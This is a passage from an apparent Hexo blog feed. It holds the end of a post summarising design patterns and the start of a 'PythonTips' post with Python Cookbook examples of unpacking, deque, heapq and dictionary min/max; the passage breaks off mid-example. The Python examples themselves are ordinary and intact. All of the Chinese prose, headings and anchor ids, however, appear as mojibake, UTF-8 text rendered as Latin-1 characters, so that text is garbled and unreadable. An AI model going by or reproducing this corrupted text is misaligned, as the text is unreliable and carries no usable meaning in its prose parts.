èƒ½å¤Ÿä¿è¯ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œ å¹¶æä¾›ä¸€ä¸ªè®¿é—®è¯¥å®ä¾‹çš„å…¨å±€èŠ‚ç‚¹ã€‚</p><h3 id="ç»“æ„æ€§æ¨¡å¼"><a href="#ç»“æ„æ€§æ¨¡å¼" class="headerlink" title="ç»“æ„æ€§æ¨¡å¼"></a>ç»“æ„æ€§æ¨¡å¼</h3><h4 id="é€‚é…å™¨æ¨¡å¼"><a href="#é€‚é…å™¨æ¨¡å¼" class="headerlink" title="é€‚é…å™¨æ¨¡å¼"></a>é€‚é…å™¨æ¨¡å¼</h4><p>ä»‹ç»ï¼šé€‚é…å™¨æ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ å®ƒèƒ½ä½¿æ¥å£ä¸å…¼å®¹çš„å¯¹è±¡èƒ½å¤Ÿç›¸äº’åˆä½œã€‚</p><h4 id="æ¡¥æ¥æ¨¡å¼"><a href="#æ¡¥æ¥æ¨¡å¼" class="headerlink" title="æ¡¥æ¥æ¨¡å¼"></a>æ¡¥æ¥æ¨¡å¼</h4><p>ä»‹ç»ï¼šæ¡¥æ¥æ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ å¯å°†ä¸€ä¸ªå¤§ç±»æˆ–ä¸€ç³»åˆ—ç´§å¯†ç›¸å…³çš„ç±»æ‹†åˆ†ä¸ºæŠ½è±¡å’Œå®ç°ä¸¤ä¸ªç‹¬ç«‹çš„å±‚æ¬¡ç»“æ„ï¼Œ ä»è€Œèƒ½åœ¨å¼€å‘æ—¶åˆ†åˆ«ä½¿ç”¨ã€‚</p><h4 id="ç»„åˆæ¨¡å¼"><a href="#ç»„åˆæ¨¡å¼" class="headerlink" title="ç»„åˆæ¨¡å¼"></a>ç»„åˆæ¨¡å¼</h4><p>ä»‹ç»ï¼šç»„åˆæ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ ä½ å¯ä»¥ä½¿ç”¨å®ƒå°†å¯¹è±¡ç»„åˆæˆæ ‘çŠ¶ç»“æ„ï¼Œ å¹¶ä¸”èƒ½åƒä½¿ç”¨ç‹¬ç«‹å¯¹è±¡ä¸€æ ·ä½¿ç”¨å®ƒä»¬ã€‚</p><h4 id="è£…é¥°æ¨¡å¼"><a href="#è£…é¥°æ¨¡å¼" class="headerlink" title="è£…é¥°æ¨¡å¼"></a>è£…é¥°æ¨¡å¼</h4><p>ä»‹ç»ï¼šè£…é¥°æ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ å…è®¸ä½ é€šè¿‡å°†å¯¹è±¡æ”¾å…¥åŒ…å«è¡Œä¸ºçš„ç‰¹æ®Šå°è£…å¯¹è±¡ä¸­æ¥ä¸ºåŸå¯¹è±¡ç»‘å®šæ–°çš„è¡Œä¸ºã€‚</p><h4 id="å¤–è§‚æ¨¡å¼"><a href="#å¤–è§‚æ¨¡å¼" class="headerlink" title="å¤–è§‚æ¨¡å¼"></a>å¤–è§‚æ¨¡å¼</h4><p>ä»‹ç»ï¼šå¤–è§‚æ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ èƒ½ä¸ºç¨‹åºåº“ã€ æ¡†æ¶æˆ–å…¶ä»–å¤æ‚ç±»æä¾›ä¸€ä¸ªç®€å•çš„æ¥å£ã€‚</p><h4 id="äº«å…ƒæ¨¡å¼"><a href="#äº«å…ƒæ¨¡å¼" class="headerlink" title="äº«å…ƒæ¨¡å¼"></a>äº«å…ƒæ¨¡å¼</h4><p>ä»‹ç»ï¼šäº«å…ƒæ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ å®ƒæ‘’å¼ƒäº†åœ¨æ¯ä¸ªå¯¹è±¡ä¸­ä¿å­˜æ‰€æœ‰æ•°æ®çš„æ–¹å¼ï¼Œ é€šè¿‡å…±äº«å¤šä¸ªå¯¹è±¡æ‰€å…±æœ‰çš„ç›¸åŒçŠ¶æ€ï¼Œ è®©ä½ èƒ½åœ¨æœ‰é™çš„å†…å­˜å®¹é‡ä¸­è½½å…¥æ›´å¤šå¯¹è±¡ã€‚</p><h4 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h4><p>ä»‹ç»ï¼šä»£ç†æ¨¡å¼æ˜¯ä¸€ç§ç»“æ„å‹è®¾è®¡æ¨¡å¼ï¼Œ è®©ä½ èƒ½å¤Ÿæä¾›å¯¹è±¡çš„æ›¿ä»£å“æˆ–å…¶å ä½ç¬¦ã€‚ ä»£ç†æ§åˆ¶ç€å¯¹äºåŸå¯¹è±¡çš„è®¿é—®ï¼Œ å¹¶å…è®¸åœ¨å°†è¯·æ±‚æäº¤ç»™å¯¹è±¡å‰åè¿›è¡Œä¸€äº›å¤„ç†ã€‚</p><h3 id="è¡Œä¸ºæ¨¡å¼"><a href="#è¡Œä¸ºæ¨¡å¼" class="headerlink" title="è¡Œä¸ºæ¨¡å¼"></a>è¡Œä¸ºæ¨¡å¼</h3><h4 id="è´£ä»»é“¾æ¨¡å¼"><a href="#è´£ä»»é“¾æ¨¡å¼" class="headerlink" title="è´£ä»»é“¾æ¨¡å¼"></a>è´£ä»»é“¾æ¨¡å¼</h4><p>ä»‹ç»ï¼šè´£ä»»é“¾æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å…è®¸ä½ å°†è¯·æ±‚æ²¿ç€å¤„ç†è€…é“¾è¿›è¡Œå‘é€ã€‚ æ”¶åˆ°è¯·æ±‚åï¼Œ æ¯ä¸ªå¤„ç†è€…å‡å¯å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œ æˆ–å°†å…¶ä¼ é€’ç»™é“¾ä¸Šçš„ä¸‹ä¸ªå¤„ç†è€…ã€‚</p><h4 id="å‘½ä»¤æ¨¡å¼"><a href="#å‘½ä»¤æ¨¡å¼" class="headerlink" title="å‘½ä»¤æ¨¡å¼"></a>å‘½ä»¤æ¨¡å¼</h4><p>ä»‹ç»ï¼šå‘½ä»¤æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å®ƒå¯å°†è¯·æ±‚è½¬æ¢ä¸ºä¸€ä¸ªåŒ…å«ä¸è¯·æ±‚ç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯çš„ç‹¬ç«‹å¯¹è±¡ã€‚ è¯¥è½¬æ¢è®©ä½ èƒ½æ ¹æ®ä¸åŒçš„è¯·æ±‚å°†æ–¹æ³•å‚æ•°åŒ–ã€ å»¶è¿Ÿè¯·æ±‚æ‰§è¡Œæˆ–å°†å…¶æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œ ä¸”èƒ½å®ç°å¯æ’¤é”€æ“ä½œã€‚</p><h4 id="è¿­ä»£å™¨æ¨¡å¼"><a href="#è¿­ä»£å™¨æ¨¡å¼" class="headerlink" title="è¿­ä»£å™¨æ¨¡å¼"></a>è¿­ä»£å™¨æ¨¡å¼</h4><p>ä»‹ç»ï¼šè¿­ä»£å™¨æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ è®©ä½ èƒ½åœ¨ä¸æš´éœ²é›†åˆåº•å±‚è¡¨ç°å½¢å¼ ï¼ˆåˆ—è¡¨ã€ æ ˆå’Œæ ‘ç­‰ï¼‰ çš„æƒ…å†µä¸‹éå†é›†åˆä¸­æ‰€æœ‰çš„å…ƒç´ ã€‚</p><h4 id="ä¸­ä»‹è€…æ¨¡å¼"><a href="#ä¸­ä»‹è€…æ¨¡å¼" class="headerlink" title="ä¸­ä»‹è€…æ¨¡å¼"></a>ä¸­ä»‹è€…æ¨¡å¼</h4><p>ä»‹ç»ï¼šä¸­ä»‹è€…æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ èƒ½è®©ä½ å‡å°‘å¯¹è±¡ä¹‹é—´æ··ä¹±æ— åºçš„ä¾èµ–å…³ç³»ã€‚ è¯¥æ¨¡å¼ä¼šé™åˆ¶å¯¹è±¡ä¹‹é—´çš„ç›´æ¥äº¤äº’ï¼Œ è¿«ä½¿å®ƒä»¬é€šè¿‡ä¸€ä¸ªä¸­ä»‹è€…å¯¹è±¡è¿›è¡Œåˆä½œã€‚</p><h4 id="å¤‡å¿˜å½•æ¨¡å¼"><a href="#å¤‡å¿˜å½•æ¨¡å¼" class="headerlink" title="å¤‡å¿˜å½•æ¨¡å¼"></a>å¤‡å¿˜å½•æ¨¡å¼</h4><p>ä»‹ç»ï¼šå¤‡å¿˜å½•æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å…è®¸åœ¨ä¸æš´éœ²å¯¹è±¡å®ç°ç»†èŠ‚çš„æƒ…å†µä¸‹ä¿å­˜å’Œæ¢å¤å¯¹è±¡ä¹‹å‰çš„çŠ¶æ€ã€‚</p><h4 id="è§‚å¯Ÿè€…æ¨¡å¼"><a href="#è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼"></a>è§‚å¯Ÿè€…æ¨¡å¼</h4><p>ä»‹ç»ï¼šè§‚å¯Ÿè€…æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å…è®¸ä½ å®šä¹‰ä¸€ç§è®¢é˜…æœºåˆ¶ï¼Œ å¯åœ¨å¯¹è±¡äº‹ä»¶å‘ç”Ÿæ—¶é€šçŸ¥å¤šä¸ª â€œè§‚å¯Ÿâ€ è¯¥å¯¹è±¡çš„å…¶ä»–å¯¹è±¡ã€‚</p><h4 id="çŠ¶æ€æ¨¡å¼"><a href="#çŠ¶æ€æ¨¡å¼" class="headerlink" title="çŠ¶æ€æ¨¡å¼"></a>çŠ¶æ€æ¨¡å¼</h4><p>ä»‹ç»ï¼šçŠ¶æ€æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ è®©ä½ èƒ½åœ¨ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€å˜åŒ–æ—¶æ”¹å˜å…¶è¡Œä¸ºï¼Œ ä½¿å…¶çœ‹ä¸Šå»å°±åƒæ”¹å˜äº†è‡ªèº«æ‰€å±çš„ç±»ä¸€æ ·ã€‚</p><h4 id="ç­–ç•¥æ¨¡å¼"><a href="#ç­–ç•¥æ¨¡å¼" class="headerlink" title="ç­–ç•¥æ¨¡å¼"></a>ç­–ç•¥æ¨¡å¼</h4><p>ä»‹ç»ï¼šç­–ç•¥æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å®ƒèƒ½è®©ä½ å®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼Œ å¹¶å°†æ¯ç§ç®—æ³•åˆ†åˆ«æ”¾å…¥ç‹¬ç«‹çš„ç±»ä¸­ï¼Œ ä»¥ä½¿ç®—æ³•çš„å¯¹è±¡èƒ½å¤Ÿç›¸äº’æ›¿æ¢ã€‚</p><h4 id="æ¨¡æ¿æ–¹æ³•æ¨¡å¼"><a href="#æ¨¡æ¿æ–¹æ³•æ¨¡å¼" class="headerlink" title="æ¨¡æ¿æ–¹æ³•æ¨¡å¼"></a>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</h4><p>ä»‹ç»ï¼šæ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å®ƒåœ¨è¶…ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªç®—æ³•çš„æ¡†æ¶ï¼Œ å…è®¸å­ç±»åœ¨ä¸ä¿®æ”¹ç»“æ„çš„æƒ…å†µä¸‹é‡å†™ç®—æ³•çš„ç‰¹å®šæ­¥éª¤ã€‚</p><h4 id="è®¿é—®è€…æ¨¡å¼"><a href="#è®¿é—®è€…æ¨¡å¼" class="headerlink" title="è®¿é—®è€…æ¨¡å¼"></a>è®¿é—®è€…æ¨¡å¼</h4><p>ä»‹ç»ï¼šè®¿é—®è€…æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œ å®ƒèƒ½å°†ç®—æ³•ä¸å…¶æ‰€ä½œç”¨çš„å¯¹è±¡éš”ç¦»å¼€æ¥ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;å­¦ä¹ &lt;code&gt;Python&lt;/code&gt;è®¾è®¡æ¨¡å¼ã€‚&lt;/p&gt;
&lt;h3 id=&quot;è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆ&quot;&gt;&lt;a href=&quot;#è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆ&quot; cla
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PythonTips(Part 1)</title>
    <link href="elssm.github.io/2023/09/16/PythonTips-Part-1/"/>
    <id>elssm.github.io/2023/09/16/PythonTips-Part-1/</id>
    <published>2023-09-16T10:43:43.000Z</published>
    <updated>2023-10-18T13:31:18.792Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨<code>python cookbook</code>ä¸­å­¦åˆ°çš„å¾ˆå¤š<code>python</code>æŠ€å·§ï¼ŒåŸºæœ¬éƒ½æ˜¯å·¥ä½œä¸­åš<code>python</code>å¼€å‘é‡åˆ°çš„å®é™…é—®é¢˜ï¼Œå®ç”¨æ€§å¾ˆå¼ºï¼Œæ•…è®°å½•äºæ­¤ã€‚</p><h3 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><h4 id="åºåˆ—åˆ†è§£"><a href="#åºåˆ—åˆ†è§£" class="headerlink" title="åºåˆ—åˆ†è§£"></a>åºåˆ—åˆ†è§£</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = (<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b = p</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'elssm'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b,c,d,e = s</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="string">'l'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line"><span class="string">'s'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line"><span class="string">'s'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e</span><br><span class="line"><span class="string">'m'</span></span><br></pre></td></tr></table></figure><h4 id="è§£å‹å¯è¿­ä»£å¯¹è±¡èµ‹å€¼ç»™å¤šä¸ªå˜é‡"><a href="#è§£å‹å¯è¿­ä»£å¯¹è±¡èµ‹å€¼ç»™å¤šä¸ªå˜é‡" class="headerlink" title="è§£å‹å¯è¿­ä»£å¯¹è±¡èµ‹å€¼ç»™å¤šä¸ªå˜é‡"></a>è§£å‹å¯è¿­ä»£å¯¹è±¡èµ‹å€¼ç»™å¤šä¸ªå˜é‡</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>record = (<span class="string">'elssm'</span>,<span class="string">'test@qq.com'</span>,<span class="string">'13888888888'</span>,<span class="string">'15888888888'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name,email,*phones = record</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name</span><br><span class="line"><span class="string">'elssm'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>email</span><br><span class="line"><span class="string">'test@qq.com'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>phones</span><br><span class="line">[<span class="string">'13888888888'</span>, <span class="string">'15888888888'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>*front,end = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>front</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>end</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="ä¿ç•™æœ‰é™å†å²è®°å½•"><a href="#ä¿ç•™æœ‰é™å†å²è®°å½•" class="headerlink" title="ä¿ç•™æœ‰é™å†å²è®°å½•"></a>ä¿ç•™æœ‰é™å†å²è®°å½•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = deque(maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], maxlen=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><code>deque</code>å¢åˆ æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = deque()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.appendleft(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.pop()</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.popleft()</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">1</span>, <span class="number">2</span>])</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾æœ€å¤§æˆ–æœ€å°çš„Nä¸ªå…ƒç´ "><a href="#æŸ¥æ‰¾æœ€å¤§æˆ–æœ€å°çš„Nä¸ªå…ƒç´ " class="headerlink" title="æŸ¥æ‰¾æœ€å¤§æˆ–æœ€å°çš„Nä¸ªå…ƒç´ "></a>æŸ¥æ‰¾æœ€å¤§æˆ–æœ€å°çš„Nä¸ªå…ƒç´ </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> heapq</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>heapq.nlargest(<span class="number">3</span>,nums)</span><br><span class="line">[<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>heapq.nsmallest(<span class="number">3</span>,nums)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>å¤„ç†æ›´å¤æ‚çš„çš„æ•°æ®ç»“æ„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>portfolio = [</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'IBM'</span>, <span class="string">'shares'</span>: <span class="number">100</span>, <span class="string">'price'</span>: <span class="number">91.1</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'AAPL'</span>, <span class="string">'shares'</span>: <span class="number">50</span>, <span class="string">'price'</span>: <span class="number">543.22</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'FB'</span>, <span class="string">'shares'</span>: <span class="number">200</span>, <span class="string">'price'</span>: <span class="number">21.09</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'HPQ'</span>, <span class="string">'shares'</span>: <span class="number">35</span>, <span class="string">'price'</span>: <span class="number">31.75</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'YHOO'</span>, <span class="string">'shares'</span>: <span class="number">45</span>, <span class="string">'price'</span>: <span class="number">16.35</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'name'</span>: <span class="string">'ACME'</span>, <span class="string">'shares'</span>: <span class="number">75</span>, <span class="string">'price'</span>: <span class="number">115.65</span>&#125;</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cheap = heapq.nsmallest(<span class="number">3</span>, portfolio, key=<span class="keyword">lambda</span> s: s[<span class="string">'price'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cheap</span><br><span class="line">[&#123;<span class="string">'name'</span>: <span class="string">'YHOO'</span>, <span class="string">'shares'</span>: <span class="number">45</span>, <span class="string">'price'</span>: <span class="number">16.35</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'FB'</span>, <span class="string">'shares'</span>: <span class="number">200</span>, <span class="string">'price'</span>: <span class="number">21.09</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'HPQ'</span>, <span class="string">'shares'</span>: <span class="number">35</span>, <span class="string">'price'</span>: <span class="number">31.75</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>expensive = heapq.nlargest(<span class="number">3</span>, portfolio, key=<span class="keyword">lambda</span> s: s[<span class="string">'price'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>expensive</span><br><span class="line">[&#123;<span class="string">'name'</span>: <span class="string">'AAPL'</span>, <span class="string">'shares'</span>: <span class="number">50</span>, <span class="string">'price'</span>: <span class="number">543.22</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'ACME'</span>, <span class="string">'shares'</span>: <span class="number">75</span>, <span class="string">'price'</span>: <span class="number">115.65</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'IBM'</span>, <span class="string">'shares'</span>: <span class="number">100</span>, <span class="string">'price'</span>: <span class="number">91.1</span>&#125;]</span><br></pre></td></tr></table></figure><h4 id="å­—å…¸è¿ç®—"><a href="#å­—å…¸è¿ç®—" class="headerlink" title="å­—å…¸è¿ç®—"></a>å­—å…¸è¿ç®—</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>prices = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'ACME'</span>: <span class="number">45.23</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'AAPL'</span>: <span class="number">612.78</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'IBM'</span>: <span class="number">205.55</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'HPQ'</span>: <span class="number">37.20</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'FB'</span>: <span class="number">10.75</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min_price = min(zip(prices.values(),prices.keys()))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min_price</span><br><span class="line">(<span class="number">10.75</span>, <span class="string">'FB'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max_price = max(zip(prices.values(),prices.keys()))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max_price</span><br><span class="line">(<span class="number">612.78</span>, <span class="string">'AAPL'</span>)</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾ä¸¤å­—å…¸çš„ç›¸åŒç‚¹"><a href="#æŸ¥æ‰¾ä¸¤å­—å…¸çš„ç›¸åŒç‚¹" class="headerlink" title="æŸ¥æ‰¾ä¸¤å­—å…¸çš„ç›¸åŒç‚¹"></a>æŸ¥æ‰¾ä¸¤å­—å…¸çš„ç›¸åŒç‚¹</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'x'</span> : <span class="number">1</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'y'</span> : <span class="number">2</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'z'</span> : <span class="number">3</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'w'</span> : <span class="number">10</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'x'</span> : <span class="number">11</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'y'</span> : <span 